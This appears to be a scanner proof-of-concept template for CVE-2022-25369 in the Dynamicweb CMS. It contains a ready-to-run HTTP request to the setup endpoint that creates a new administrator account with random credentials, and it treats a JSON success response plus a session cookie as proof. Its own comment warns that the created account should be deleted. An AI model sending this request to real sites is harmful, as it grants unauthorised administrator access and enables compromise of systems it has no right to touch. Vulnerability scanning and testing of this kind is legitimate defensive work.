name: poc-yaml-dynamicweb-cve-2022-25369
binding: be9db2ed-63b4-4202-9b7f-8a287741dcef
manual: true
detail:
    author: 2husky
    links:
        - https://www.ddosi.org/cve-2022-25369/
    vulnerability:
        id: CT-437894
        level: critical
    warning: 该poc将会产生一个随机账号密码的账号，请注意删除
transport: http
set:
    f1: string(randomInt(10000, 20000)) + randomLowercase(5)
    f2: string(randomInt(10000, 20000)) + randomLowercase(5)
    f3: string(randomInt(10000, 20000)) + randomLowercase(5)
rules:
    r1:
        request:
            cache: true
            method: GET
            path: /Admin/Access/Setup/Default.aspx?Action=createadministrator&adminusername={{f1}}&adminpassword={{f2}}&adminemail={{f3}}@test.com&adminname=test
            follow_redirects: false
        expression: response.status == 200 && response.content_type.contains("json") && "\"[sS]+uccess\":\\s?true".bmatches(response.body) && response.headers["set-cookie"].contains("ASP.NET_SessionId")
expression: r1()
